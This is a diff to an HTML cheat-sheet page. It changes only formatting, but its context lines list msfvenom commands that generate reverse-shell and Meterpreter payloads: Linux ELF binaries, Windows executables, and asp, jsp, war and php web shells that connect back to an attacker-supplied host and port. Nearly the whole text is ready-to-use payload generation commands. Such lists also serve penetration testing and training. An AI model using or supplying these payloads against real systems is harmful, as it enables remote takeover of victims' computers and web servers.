@@ -19,13 +19,13 @@
     <h3>Stageless Payloads for Linux</h3>
     <p>x86 	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf</p>
       <p>x64 	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf</p>
-
+<br>
  <h1>Non-Meterpreter Web Payloads</h1>
         <p>asp	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp</p>
    <p>jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp</p>
   <p>war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war</p>
   <p>php	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php</p>
-
+<br>
     <h1> Meterpreter Binaries </h1>
     <h3>Staged Payloads for Windows</h3>
 <p>x86	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe</p>
@@ -42,7 +42,7 @@
   <h3>Stageless Payloads for Linux</h3>
 <p>x86	msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf</p>
 <p>x64	msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf</p>
-
+<br>
 <h1>Meterpreter Web Payloads</h1>
   <p>asp	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp</p>
   <p>jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp</p>
